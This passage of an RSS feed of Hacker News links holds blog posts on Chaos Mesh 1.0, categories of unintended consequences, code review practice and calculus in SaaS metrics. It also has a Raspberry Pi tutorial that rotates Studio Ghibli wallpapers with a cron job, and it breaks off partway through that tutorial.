the results of the chaos experiment‚Äîall in the same web interface.</p><p><img alt="Chaos Dashboard" src="https://chaos-mesh.org/assets/images/chaos-dashboard-0a1e48c54968d276f174801a1364ce21.gif"></p><h2>Grafana plug-in for enhanced observability</h2><p>To further improve the observability of chaos experiments, Chaos Mesh 1.0 includes a Grafana plug-in to allow you to directly display real-time chaos experiment information on your application monitoring panel. Currently, the chaos experiment information is displayed as annotations. This way, you can simultaneously observe the running status of the application and the current chaos experiment information.</p><p><img alt="Chaos status and application status on Grafana" src="https://chaos-mesh.org/assets/images/chaos-status-460b054f3e2ee0898d2236a5137bc30e.png"></p><h2>Safe and controllable chaos</h2><p>When we conduct chaos experiments, it is vital that we keep strict control over the chaos scope or ‚Äúblast radius.‚Äù Chaos Mesh 1.0 not only provides a wealth of selectors to accurately control the scope of the experiment, but it also enables you to set protected Namespaces to protect important applications. You can also use Namespace permissions to limit the scope of Chaos Mesh to a specific Namespace. Together, these features make chaos experiments with Chaos Mesh safe and controllable.</p><h2>Try it out now</h2><p>You can quickly deploy Chaos Mesh in your Kubernetes environment through the <code>install.sh</code> script or the Helm tool. For specific installation steps, please refer to the <a href="https://chaos-mesh.org/docs/installation/installation" target="_blank" rel="noopener noreferrer">Chaos Mesh Getting Started</a> document. In addition, thanks to the <a href="https://chaos-mesh.org/interactiveTutorial" target="_blank" rel="noopener noreferrer">Katakoda interactive tutorial</a>, you can also quickly get your hands on Chaos Mesh without having to deploy it.</p><p>If you haven‚Äôt upgraded to 1.0 GA, please refer to the <a href="https://github.com/chaos-mesh/chaos-mesh/releases/tag/v1.0.0" target="_blank" rel="noopener noreferrer">1.0 Release Notes</a> for the changes and upgrade guidelines.</p><h2>Thanks</h2><p>Thanks to all our Chaos Mesh <a href="https://github.com/chaos-mesh/chaos-mesh/graphs/contributors" target="_blank" rel="noopener noreferrer">contributors</a>!</p><p>If you are interested in Chaos Mesh, you‚Äôre welcome to join us by submitting issues, or contributing code, documentation, or articles. We look forward to your participation and feedback!</p></section></div>]]>
            </description>
            <link>https://chaos-mesh.org/blog/chaos-mesh-1.0-chaos-engineering-on-kubernetes-made-easier</link>
            <guid isPermaLink="false">hacker-news-small-sites-24595568</guid>
            <pubDate>Sat, 26 Sep 2020 01:03:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Categories of Unintended Consequences]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24595558">thread link</a>) | @paulorlando
<br/>
September 25, 2020 | https://unintendedconsequenc.es/categories-of-unintended-consequences/ | <a href="https://web.archive.org/web/*/https://unintendedconsequenc.es/categories-of-unintended-consequences/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-487">
		<!-- .entry-header -->

	
	<div>
		<p><em>There are many frameworks with which to evaluate unintended consequences. So far in my writing here I‚Äôve looked at examples arranged around a theme (species introduction, food, government policy, human behavior etc) where there is a somewhat clear relationship between cause and effect (even if sometimes only in hindsight). I haven‚Äôt yet touched frameworks of complexity and won‚Äôt do so until I go deeper into more second-order effects.</em></p>
<p><em>This week I step back and look at basic categories of unintended consequences and call out potential new areas of exposure to second-order effects.</em></p>
<figure id="attachment_499" aria-describedby="caption-attachment-499"><img src="https://unintendedconsequenc.es/wp-content/uploads/2018/10/Unintended-Consequences-Categories-1024x742.png" alt="Unintended Consequences Categories" width="525" height="380" srcset="https://unintendedconsequenc.es/wp-content/uploads/2018/10/Unintended-Consequences-Categories-1024x742.png 1024w, https://unintendedconsequenc.es/wp-content/uploads/2018/10/Unintended-Consequences-Categories-300x217.png 300w, https://unintendedconsequenc.es/wp-content/uploads/2018/10/Unintended-Consequences-Categories-768x556.png 768w, https://unintendedconsequenc.es/wp-content/uploads/2018/10/Unintended-Consequences-Categories.png 1390w" sizes="(max-width: 525px) 100vw, 525px"><figcaption id="caption-attachment-499">General categories of unintended consequences</figcaption></figure>

<p><strong>Unexpected Benefits</strong> are, as the name describes, positive yet unplanned outcomes. I position the starting point (‚ÄúEvent‚Äù) differently since there was no related goal in these cases. In the chart above, the actual event (A) has happened and later on positive outcome (B) is found.</p>
<p>My earlier <a href="https://unintendedconsequenc.es/what-are-unexpected-benefits/">post</a> calls into question some common examples of this category, such as no-man‚Äôs lands, sunken ships turning into reefs, and drugs producing unexpected benefits. And as we look for them broadly, benefits will always be found. Positive benefits are <strong>impossible to not find</strong> as long as you think broadly and creatively.</p>
<p>But my question is just how applicable the above common examples are as unexpected benefits. If we understand (or eventually understand) a cause and effect relationship, such as the reclamation of nature over a certain time in a new no-man‚Äôs land, then the benefit is <strong>predictable and even unavoidable</strong>. That doesn‚Äôt strike me as an unexpected. The new drug effect from above (where inter-reactions are not yet fully understood) is closer to a good example of this category. See my earlier <a href="https://unintendedconsequenc.es/what-are-unexpected-benefits/">post</a> for details.</p>
<p><strong>Unexpected Drawbacks</strong>&nbsp;occur when an intended change in an item or group leads to a worsening in a different item or group.&nbsp;In the chart above, the goal was to improve (A) and later it is learned that (B) has been made worse.</p>
<p>Some of these drawbacks may be to populations smaller than the beneficiaries. For example, relatively larger passenger populations who benefit from rideshare companies do so while traditional taxi companies and taxi medallion owners suffer.</p>
<p>In addition to these examples, I believe a way to identify potential exposure to an unexpected drawback is to be aware of&nbsp;<a href="https://unintendedconsequenc.es/anything-at-scale/">anything new being done at scale</a>.</p>
<p>An example I have not yet written about is the change in media business models in the last couple decades. In general, in the past, access to national news media was limited and controlled in few popular TV networks and large-scale newspaper syndicates. With online distribution and the scattering of media sources from the above to include blogs, podcasts, social media, and more, the business model now revolves around fomenting arguments and taking sides in order to generate more views and shares, which then fuel ad revenue. Good for the media businesses that can do it, but it seems to be bad for media consumers.</p>
<p><strong>Perverse Results</strong> are often the most frustrating category, yet they are common.&nbsp;In the chart above, the goal was to improve (A) but what actually happens is (A) becomes worse.</p>
<p>We‚Äôve discussed this category in <a href="https://unintendedconsequenc.es/food-from-thought/">deep plow farming and agricultural subsidies</a>, <a href="https://unintendedconsequenc.es/the-self-defeating-prophecy/">self-defeating prophesies</a>, <a href="https://unintendedconsequenc.es/importing-risk-and-risky-regulations/">endangered species regulatory protection</a>, the <a href="https://unintendedconsequenc.es/the-cobra-effect-redesigned/">cobra effect</a>, and more.</p>
<p>I do make the claim that in some situations (the animal examples of the cobra effect, especially) the solution is often built into the problem. In other situations, like in deep plowing, small tests could have prevented widescale adoption, but the issue was political, not scientific (or that science became political).</p>

<p>This is a short list of areas where there is potential for unintended consequences (though these have not yet become big problems and I hope they never will). I‚Äôll cover this list and others in more detail in the future.</p>
<p><a href="https://unintendedconsequenc.es/autonomous-vehicles-scaling-risk/"><strong>Autonomous vehicles</strong></a> (AVs). There is an expected class of social changes related to AVs that are linear in nature. That‚Äôs the problem with them‚Ä¶ Traffic reduction (traffic might actually increase), accident reduction (yet there will then be exposure to systemic risk to hacking or bugs), and more.</p>
<p><strong>Cannabis legalization</strong>. If cannabis replaces alcohol as the intoxicant of choice, there will be different effects on health and behavior.</p>
<p><strong>CRISPR</strong>, the inexpensive gene editing technology was discovered and developed based on the process certain bacteria use. The potential for second-order effects comes from CRISPR‚Äôs low cost and availability and that changes made to organisms‚Äô genes could mean that those changes are passed down to progeny.&nbsp;New unpredictable changes in future organisms could appear.</p>
<p><strong>Drones</strong>. As surveillance and military tools, drones change the risks shared between adversaries internationally. What will happen if the same technology is applied domestically in the US or other countries? Will the ease of drone weaponization mean that large outdoor gatherings will not be allowed (at least without anti-drone technology)?</p>
<p><strong>Education</strong>. The new need for endowment-building (I earlier did cover&nbsp;<a href="https://unintendedconsequenc.es/the-university-fundraising-arms-race/">university funding</a> as a forward-looking second-order effect) puts universities in a timing trade off (raise money now and potentially deal with more problems later).</p>
<p>Another potential effect: while the increase in STEM education has positive roots, what if the education as delivered actually bores students and turns them off to the sciences? Could STEM education have the reverse effect intended?</p>
<p>Also, the large growth in student loans, now at $1.4 trillion in the US, has the markings of a large potential problem waiting for a spark to set off defaults.</p>
<p><strong>Over-encouragement of startups</strong>. In some markets, startups are oversold as good choices for talent. But statistically, most of the time talent will earn less building a startup than working at a growth-stage or stable business. Then again, part of startup compensation comes from feeling excited about your work and the potential for asymmetric payoffs. In many markets, where startups are the most hyped, it is not the founders (who take more of the risk), but others who more regularly benefit. Groups more likely to benefit include investors who can spread their risk around, community organizers who build their own brand, and ‚Äúsellers of shovels‚Äù to the startups themselves. So here the unintended consequence could be that by encouraging more startups, you actually make life more difficult for the startup founders.</p>
<p><em>OK, we stepped back this week and will be back with a new look at second-order effects next week.</em></p>
	</div><!-- .entry-content -->

	
</article></div>]]>
            </description>
            <link>https://unintendedconsequenc.es/categories-of-unintended-consequences/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24595558</guid>
            <pubDate>Sat, 26 Sep 2020 01:00:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Sqwok.im ‚Äì open, simple, url-based chat aggregator, now with mentions]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24595111">thread link</a>) | @holler
<br/>
September 25, 2020 | https://sqwok.im/p/SEiKM16yDXxbWw?tab=chat | <a href="https://web.archive.org/web/*/https://sqwok.im/p/SEiKM16yDXxbWw?tab=chat">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://sqwok.im/p/SEiKM16yDXxbWw?tab=chat</link>
            <guid isPermaLink="false">hacker-news-small-sites-24595111</guid>
            <pubDate>Fri, 25 Sep 2020 23:33:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Better Code Review ‚Äì Gilad Peleg]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24594968">thread link</a>) | @nightfuryx
<br/>
September 25, 2020 | https://www.giladpeleg.com/blog/better-code-review/ | <a href="https://web.archive.org/web/*/https://www.giladpeleg.com/blog/better-code-review/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><blockquote>
<p>"Everyone gets the experience. Some get the lesson." T.S. Eliot</p>
</blockquote>
<p>Contributing to a project is not an easy task, especially if you're new to the project, new to coding in general, or
just not an active contributor.</p>
<p>I have been on both sides, the contributing side and the reviewing side. I've made mistakes on both. The mistakes I
regret the most are the ones I've made on the reviewing side. Some are obvious, some are not. All of them could have
made the contributor's life, whether a developer on the team, or a contributor in an open source project, much easier.</p>
<p>A critical point to make, and something that I personally do not accept as a manager or as a developer, are actions
taken on either side which are made with bad intent. So while innocent mistakes are fine, we all make them, knowingly or
not, doing bad by intent is not acceptable behavior at all. Following up on the previous point,
by making intentional mistakes, I mean following imperfect guidelines, or having a
false perception of what's important or how to convey it, in contrast with having malicious intentions with your
actions.</p>
<h2 id="insignificant-factors"><a href="#insignificant-factors" aria-label="insignificant factors permalink"></a>Insignificant factors</h2>
<p>There is a big waste of time and energy in trivial, non-significant feedback. This complies perfectly with
<a href="https://en.wikipedia.org/wiki/Law_of_triviality">Parkinson's Law of Triviality</a>. People spend a disproportional amount
of time bothering with trivial details that have almost nothing to do with code semantics. From arguing about style,
function names, property names, names in general, spaces (or tabs), indentation (or lack of), braces, splitting code to
modules (or joining separate modules), extracting constants (almost religiously).</p>
<p>People also love premature optimizations (Which are known to be the
<a href="https://wiki.c2.com/?PrematureOptimization">root of all evil</a>). They do or suggest using LRU, sets instead of lists and
so many other factors, without any proven significant performance benefits, or that those are even needed. In general,
the program complexity seems to matter less than program correctness (or assumed correctness).</p>
<p>Why do we bother with such things?</p>
<ol>
<li>We underwent similar scrutiny when we were less experienced, and think it's great, or the correct path to becoming
better. Maybe it's simply something new trainees have to do.</li>
<li>People tend to spend less time thinking about the global effects of a change, and spend more time on the micro level.
This means reading and writing comments on a review as they process it. This prevents the reader from "Seeing the big
picture". Instead, we focus on tiny improvements, as if they were the important factor. "Improve this function's
name", "Extract this number as a constant.", all things we write that have almost no significant semantic code
impact. Why do we do them? They're easier to come up with, and they're also sometimes more obvious.</li>
<li>We didn't take the time removing any manual decisions about style from the review. Both the contributor and the
reviewer need to spend effort on reviewing style and this both wears them down, and simultaneously prevents them from
focusing on what matters. This is a key point I'll discuss later in <a href="#removing-obstacles">Removing obstacles</a>.</li>
<li>We find it hard to believe that
<a href="https://docs.microsoft.com/en-us/azure/devops/learn/devops-at-microsoft/code-reviews-not-primarily-finding-bugs#code-reviews-rarely-find-functional-bugs">code reviews rarely catch bugs</a>.
Yes, it's kind of shocking, we were all taught that code reviews are an effective tool for this kind of things.
They're not. They are effective for other things, discussed later in <a href="#the-important-stuff">The important stuff</a>. The
overall theme of thinking too highly about code reviews is basically science fiction. We should be spending our
energy elsewhere.</li>
<li>It's a form of control. This is a bit sad to say, and I've been there myself. Teams tend to be overly defensive about
their code and apply harsh review to external (to the team) contributors. They also sometimes apply this to more
junior developers, partly as a training tool and partly a control tool. Software code control is mostly a virtual
dance around a code repository. The alleged last defense (besides code quality tooling and deployment) is the code
review. Teams really believe it is their job to "protect the code", whatever that means, and their belief is
reinforced when they have to wake up at night due to changes done by external team members. One can say they should
have built better protective measures, or that they also wake up at night to their own changes, but it's very easy to
fall into this "guardian" trap after the n-th time they get a pager from an external person's change.</li>
<li>A form of control, but the bad kind. A person or persons are either taking care of their job security, or making sure
you know who is the owner (boss). This is a form of territorial battle, where someone who has the last word wins and
thus receives virtual fame and confidence, at least on paper. This happens a lot more than one would think it
happens, but in the end, code is written (at least in present day) by humans, who are a talking animal, but still an
animal, with a social ladder and animal-like behavior. I've been there, it's ugly. If you're in a company that has
this kind of stuff going on a lot, I suggest you run away.</li>
</ol>
<h2 id="the-important-stuff"><a href="#the-important-stuff" aria-label="the important stuff permalink"></a>The important stuff</h2>
<p>What should we use code-reviews for? To be perfectly honest, I'm not a big believer in pre-merge code-reviews (To be
explained later in <a href="#the-road-less-traveled">The road less traveled</a>). I've seen them weigh down development speed so
much, the added benefits might not be worth it. That said a code-review can be important when:</p>
<ol>
<li>The developer is new. Either entirely to the code-base or to coding. That developer is going to need feedback on both
how to code, how "we" code, and what's important to the team. In these regards, the code-review is being used as a
training class, and less than a device to add features. In a way, this is the asynchronous alternative to pair
programming or coding together.</li>
<li>Someone wanting to familiarize themselves with the code-base or changes made to it. That someone can be another
developer that you want to be aware of your new feature or changes, your tech lead or a senior engineer in the team.
A code-review helps them learn the inner-details of your new feature, that specific part of code that they don't
know, or just get better acquainted with the code-base. This means the code review is meant as an FYI to them, and in
most cases it shouldn't be blocking.</li>
<li>Reviewing system critical changes. Sometimes you do need or want an extra eye-ball on system critical changes.
Anything that can have a drastic effect on the system, from changing the way you run tests, to changing service
infrastructure, to super-hot code which is very performance oriented, to sensitive billing code. Those areas might be
worth the added blocking review, but I also assume those areas are less frequently edited.</li>
</ol>
<p>As a side, a lesser known point is that sometimes code-review are required as part of regulation policy the company is
complying with, such as SOC2. This makes code-reviewing changes required, though it doesn't make the insignificant
factors significant all of a sudden, so don't let that get in the way.</p>
<h2 id="removing-obstacles"><a href="#removing-obstacles" aria-label="removing obstacles permalink"></a>Removing obstacles</h2>
<p>As obvious as it may sound, you should be investing as much as you can in automating anything that can be automated in
code-reviews. This includes:</p>
<ol>
<li>Code formatting should be done automatically when developing and checked automatically on code-reviews. Not by a
human.</li>
<li>Automatic code linting (and any static analysis applied) should represent most of your style guide. In fact, I would
go further and say that if you can't build an automatic rule to at least warn about a style violation, you shouldn't
bring it up in code-reviews, ever. It's just not worth it. (This lesson I learned from a very smart friend who
enlightened me on this).</li>
<li>Testing, and quality assurance should both ease the pains for contributors, and increase confidence for maintainers.
If they don't - you should either delete or fix them. I've worked on code-bases where the tests would just slow down
the developer, never actually giving valid input. What are they useful besides wasting our time (or making it harder
to contribute)? Adding useful tests improves development speed and confidence, not slow it down. It also lowers the
blast radius, making errors less deadly in production (By allowing less brutal errors to pass through,
unintentionally).</li>
<li>Extending the previous points, I would go further and argue that any non-semantic review comments should be kept to a
minimum, preferably non-existent. Contributors should feel safe contributing, and know that even if they poorly named
their variable, everything is going to be ok, assuming their code still works. This can also be fixed in retrospect
(supporting post-merge workflows), as it has no semantic difference.</li>
</ol>
<p>Despite all the above, it is in my experience that developers find it very hard to let go of old practices. I know I
did. Once you understand the enormous negative side-benefits of focusing on the trivial stuff, you understand they are
waste of time and energy. To all sides.</p>
<p>A question I get asked sometimes is why should you allow bad code practices to slip through to your code, especially if
you're the owner of it, and a contributor is just passing through. My answer is simple.
You want the code review to be effective and focus <strong>only on what's important</strong>. Critical stuff you
might have missed. Everything else is a distraction meant to make the code prettier, but probably not better.</p>
<p>If you have concerns about code style add a linter. Add static rules that prevent adding this bad change. Better yet,
prefer automatic fixing of code style (when possible). Style should be a solved problem,
and I don't care what style it is - as long as I don't have to actively think about it
when contributing (or reviewing).</p>
<p>A thought that I always try to propagate is to treat others (contributors) as a reviewer the same as you would like to
be treated when contributing.</p>
<h2 id="harmful-stuff"><a href="#harmful-stuff" aria-label="harmful stuff permalink"></a>Harmful stuff</h2>
<p>Review comments have a style of their own. A lot has been written on reviewer hostility, and I'd like to assume you
understand how comments should be styled.</p>
<p>See <a href="https://medium.com/@sandya.sankarram/unlearning-toxic-behaviors-in-a-code-review-culture-b7c295452a3c">Unlearning toxic behaviors in a code review culture</a> for ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.giladpeleg.com/blog/better-code-review/">https://www.giladpeleg.com/blog/better-code-review/</a></em></p>]]>
            </description>
            <link>https://www.giladpeleg.com/blog/better-code-review/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24594968</guid>
            <pubDate>Fri, 25 Sep 2020 23:05:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Calculus in SaaS]]>
            </title>
            <description>
<![CDATA[
Score 47 | Comments 19 (<a href="https://news.ycombinator.com/item?id=24594833">thread link</a>) | @Lukas1994
<br/>
September 25, 2020 | https://www.causal.app/blog/calculus-in-saas | <a href="https://web.archive.org/web/*/https://www.causal.app/blog/calculus-in-saas">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>Note:&nbsp;this was originally published at </em><a href="https://alexoppenheimer.substack.com/" target="_blank"><em>https://alexoppenheimer.substack.com/</em></a>‚Äç</p><p>I have been studying the SaaS model in depth for almost 7 years now. Since the day <a href="https://alexoppenheimer.substack.com/p/harry-2d5d1af6bf">Harry Weller</a> walked into my office with a stack of materials and told me to study it and then SaaS build models and bring them to portfolio companies, I don't think a day has gone by where I have not thought about the conceptual and operational nuances of the recurring revenue business model.</p><p>Somewhere around mid 2015 I had my "aha" moment in my research when I tied my academic training in mechanical engineering to the startup business models I was building: it's all calculus. The integral-derivative relationship applies incredibly well to the ARR and Recognized Revenue relationship. Making this connection between engineering math and financial math gave me a feeling that only a true nerd could appreciate: the joy of putting integral symbols and accounting terms on the same slide.</p><p>The simplest way to illustrate this mathematical parallel is with a car:</p><figure id="w-node-2abd43418357-51d2da99"><p><img src="https://uploads-ssl.webflow.com/5e8a043bfbc2c035b4d8e5b5/5f649b33c9e3271323643b3d_https%253A%252F%252Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%252Fpublic%252Fimages%252F42d5ef92-52d9-49fe-8be7-16028bee1ff4_884x306.png" alt=""></p></figure><p>If a car is moving at 60mph, then in one hour it will travel 60 miles (assuming its speed does not change). That is the definition of "miles per hour." ARR is very similar: if a company is "moving" at $10M ARR, then in one year it will recognize $10M of revenue (assuming everything stays consistent). Recognized revenue is the distance, ARR is the speed. It's critical to recognize that ARR is a rate at a specific point in time used to imply something (here, expected recognized revenue in the future period).</p><p>For the more accounting oriented, another analogy can be made to the balance sheet:</p><figure id="w-node-9fc87f218c80-51d2da99"><p><img src="https://uploads-ssl.webflow.com/5e8a043bfbc2c035b4d8e5b5/5f649b3392b0138c4e64006b_https%253A%252F%252Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%252Fpublic%252Fimages%252F6c06ddcc-de3e-4d96-960a-22b4b39e334e_842x455.png" alt=""></p></figure><p>While revenue is the top line metric on the income statement, ARR works more like a balance sheet metric: it is taken at a single point in time rather than over a period of time. This can make income statements confusing and misaligned - another example of the divergence of accounting in economics in subscription businesses.</p><p>Now back to calculus... if the ARR function was actually a mathematical equation, you could integrate it. If y = 10x where y = ARR and x = time in months, then after two months ARR = $20. After 12 months, ARR = $120 (assuming we start from $0 of ARR). So at the end of a year, the business has grown from $0 to $120 in ARR. But what is the recognized revenue? The complex answer is that it's the integral of 10x from 0 to 12 months. (Apologies in advance if this triggers a high school calculus flashback.)</p><figure><p><img src="https://uploads-ssl.webflow.com/5e8a043bfbc2c035b4d8e5b5/5f649b337d3c7911d7362b81_https%253A%252F%252Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%252Fpublic%252Fimages%252Ff7fcb57f-644b-490c-bfa8-6d0c986d2fda_305x80.png" alt=""></p></figure><p>You could also chart this out and see that it is a right triangle with the area of 1/2*base*height. Where the base is 12 months and the height is $120: $1,440/2 = $720).</p><p>Pretty cool relationship and calculation conceptually, but in real businesses ARR growth doesn't fit a simple equation (or any equation at all), so it's not inherently practical to start breaking out the power rule and your old textbooks to predict ARR growth.</p><p>If we switch back to the car analogy, it takes on a little more of a nuanced meaning. Just like a business doesn't grow on a smooth curve, car speeds do not either. Just like the gas pedal makes the car go faster and the brake pedal &amp; friction make it go slower, so too in a SaaS company, <a href="https://alexoppenheimer.substack.com/p/thin-slicing-arr">the new sales are making the speed/ARR increase and the churned customers are making the speed/ARR decrease</a>. I will dive into more details in later posts, but the goal in a car is to go as far and fast as you can while burning the least amount of fuel. So too in a SaaS company, the goal is to have the highest ARR you can, recognize the most revenue and burn the least cash. You can think about SaaS Magic Number like the fuel efficiency of a SaaS business - looking forward to diving into why this is actually helpful in building a company.</p></div></div>]]>
            </description>
            <link>https://www.causal.app/blog/calculus-in-saas</link>
            <guid isPermaLink="false">hacker-news-small-sites-24594833</guid>
            <pubDate>Fri, 25 Sep 2020 22:40:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Add Some Ghibli to Your Raspberry Pi]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24594812">thread link</a>) | @whatrocks
<br/>
September 25, 2020 | https://www.charlieharrington.com/add-some-ghibli-to-your-raspberry-pi | <a href="https://web.archive.org/web/*/https://www.charlieharrington.com/add-some-ghibli-to-your-raspberry-pi">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Maybe you caught this week's <a href="https://news.ycombinator.com/item?id=24564775">HN post</a> that <a href="http://www.ghibli.jp/info/013344/">Studio Ghibli</a> dropped 400 images into the public domain. The comments suggested that there's something odd in Japanese copyright law about taking screenshots of films, and that Studio Ghibli might have furnished these to help keep people talking about their films in reviews and whatnot.</p>
<p><span>
      <a href="https://www.charlieharrington.com/static/de45ce1eab470f024caad31db72d94e6/0f98f/marnie004.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="marnie" title="marnie" src="https://www.charlieharrington.com/static/de45ce1eab470f024caad31db72d94e6/6aca1/marnie004.jpg" srcset="https://www.charlieharrington.com/static/de45ce1eab470f024caad31db72d94e6/d2f63/marnie004.jpg 163w,
https://www.charlieharrington.com/static/de45ce1eab470f024caad31db72d94e6/c989d/marnie004.jpg 325w,
https://www.charlieharrington.com/static/de45ce1eab470f024caad31db72d94e6/6aca1/marnie004.jpg 650w,
https://www.charlieharrington.com/static/de45ce1eab470f024caad31db72d94e6/7c09c/marnie004.jpg 975w,
https://www.charlieharrington.com/static/de45ce1eab470f024caad31db72d94e6/01ab0/marnie004.jpg 1300w,
https://www.charlieharrington.com/static/de45ce1eab470f024caad31db72d94e6/0f98f/marnie004.jpg 1920w" sizes="(max-width: 650px) 100vw, 650px" loading="lazy">
  </a>
    </span></p>
<p>A more useful comment gave a nice tip for scraping the images in a single <code>wget</code> command:</p>
<div data-language="bash"><pre><code><span>wget</span> --random-wait --timestamping http://www.ghibli.jp/gallery/<span>{</span>ged,chihiro,karigurashi,ponyo,kokurikozaka,marnie,kaguyahime,kazetachinu<span>}</span><span>{</span>001<span>..</span>050<span>}</span>.jpg</code></pre></div>
<p>This uses the nice shell trick of using curly braces <code>{}</code> to expand commands and <code>..</code> to expand in a numerical or alphabetical series. I first encountered this technique in the MIT course for <a href="https://missing.csail.mit.edu/">The Missing Semester of your CS Education</a>, which I highly recommend checking out.</p>
<p>For example, <code>echo foo.{png,jpg}</code> will expand to <code>echo foo.png foo.jpg</code>, and <code>echo {1..10}</code> will expand to <code>echo 1 2 3 4 5 6 7 8 9 10</code>. </p>
<p>Perhaps this might prove useful in your terminal travels.</p>
<p>Back to Ghibli. So, now that I've got all these screenshots downloaded, what can I do with them?</p>
<h2>My little Raspberry Pi server</h2>
<p>I've got a <a href="https://www.amazon.com/gp/product/B08C4SK5C3/ref=as_li_qf_asin_il_tl?ie=UTF8&amp;tag=whatrocks09-20&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=B08C4SK5C3&amp;linkId=6371e9a8ce20a36236014adee9eaa56e">Raspberry Pi 4 with 8GB RAM</a> on my home network that I can connect to via <a href="https://tailscale.com/">Tailscale</a>. Usually, I like to SSH in there and <code>sudo apt-get update</code> and <code>sudo apt-get upgrade</code> just to feel alive. But I also have a few other use-cases.</p>
<p>I run a <a href="https://www.plex.tv/">Plex</a> server on the Pi. For a while, I also experimented with running <a href="https://www.home-assistant.io/">Home Assistant</a> on the Pi, but I just don't have that many internet of things devices (yet). I'm also planning to set up Minecraft server on the Pi, but I haven't found a non-sketchy tutorial yet.</p>
<p>Finally, I also occasionally VNC in using VNC Viewer to check out the latest magazines in the awesome Raspberry Pi magazine app, where they have free subscriptions all these awesome "maker" magazines. This alone is worth the price of a Pi, IMHO.</p>
<p>But, I was getting pretty tired of looking at the same stock desktop background everytime I VNC'ed in.</p>
<h3>Using the Ghibli images as the Pi's desktop background</h3>
<p>There's a neat command to change your Pi's desktop background from the terminal:</p>
<div data-language="bash"><pre><code>pcman --set-wallpaper /home/pi/Pictures/ghibli/ged009.jpg</code></pre></div>
<p><span>
      <a href="https://www.charlieharrington.com/static/555d1ff4e6dce7d4942dff1af03b1745/0f98f/ged009.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="marnie" title="marnie" src="https://www.charlieharrington.com/static/555d1ff4e6dce7d4942dff1af03b1745/6aca1/ged009.jpg" srcset="https://www.charlieharrington.com/static/555d1ff4e6dce7d4942dff1af03b1745/d2f63/ged009.jpg 163w,
https://www.charlieharrington.com/static/555d1ff4e6dce7d4942dff1af03b1745/c989d/ged009.jpg 325w,
https://www.charlieharrington.com/static/555d1ff4e6dce7d4942dff1af03b1745/6aca1/ged009.jpg 650w,
https://www.charlieharrington.com/static/555d1ff4e6dce7d4942dff1af03b1745/7c09c/ged009.jpg 975w,
https://www.charlieharrington.com/static/555d1ff4e6dce7d4942dff1af03b1745/01ab0/ged009.jpg 1300w,
https://www.charlieharrington.com/static/555d1ff4e6dce7d4942dff1af03b1745/0f98f/ged009.jpg 1920w" sizes="(max-width: 650px) 100vw, 650px" loading="lazy">
  </a>
    </span></p>
<p>Make sure that you've given the proper directory location for your Ghibli images, which, of course, you can get with the <code>pwd</code> print working directory command.</p>
<p>Now, I've already admit that I enjoy manually running apt-get updates, but I definitely don't want to be manually changing the background, so how about some automation?</p>
<h3>Automating a rotating background with a cron job</h3>
<p>We can use a simple cron job for this! First, let's write a one-liner command to randomly set the background from an image in our folder:</p>
<div data-language="bash"><pre><code><span>ls</span> /home/pi/Pictures/ghibli <span>|</span> <span>shuf</span> -n <span>1</span> <span>|</span> <span>xargs</span> -I<span>{</span><span>}</span> pcmanfm --set-wallpaper /home/pi/Pictures/ghibli/<span>{</span><span>}</span></code></pre></div>
<p>It looks kinda hairy, but it's pretty simple. First, we list the contents of our directory, then we used <code>shuf</code> to randomly select one of the files. In fact, if you just stopped there, your output would look like this:</p>
<div data-language="bash"><pre><code><span>ls</span> /home/pi/Pictures/ghibli <span>|</span> <span>shuf</span> -n <span>1</span>
karigurashi024.jpg</code></pre></div>
<p>But we want to pipe this randomly selected file to the <code>pcmanfm</code> command! I'm using <code>xargs</code> to do that in the next part of the command. There's probably an easier way, but this works for me.</p>
<p>So, now that we have our command to randomly select a background, we just need to write a cron job to run this command every... let's say, ten minutes. First, open up your computer's crontab file:</p>

<p>And add this to the bottom:</p>
<div data-language="text"><pre><code>*/10 * * * * ls /home/pi/Pictures/ghibli | shuf -n 1 | xargs -I{} pcmanfm --set-wallpaper /home/pi/Pictures/ghibli/{}</code></pre></div>
<p>Save the file, and you're done. Right? No. That didn't work for me. Let's look at the cron logs with this command: <code>grep CRON /var/log/syslog</code></p>
<div data-language="text"><pre><code>raspberrypi CRON[3870]: (pi) CMD (DISPLAY=:0.0 &amp;&amp; ls /home/pi/Pictures/ghibli | shuf -n 1 | xargs -I{} pcmanfm --set-wallpaper /home/pi/Pictures/ghibli/{})
raspberrypi CRON[3866]: (CRON) info (No MTA installed, discarding output)</code></pre></div>
<p>Not super helful. It does confirm that job ran, which is good, though. That rules out cron syntax errors. This <code>info</code> log is interesting. Discarding output. I don't like the sound of that. Googling reveals that we need to install a local mail server, so here we go.</p>
<div data-language="bash"><pre><code><span>sudo</span> <span>apt-get</span> <span>install</span> postfix</code></pre></div>
<p><span>
      <a href="https://www.charlieharrington.com/static/5af659ddcc5a54584ababc4499e3448d/bff4e/postfix.png" target="_blank" rel="noopener">
    <span></span>
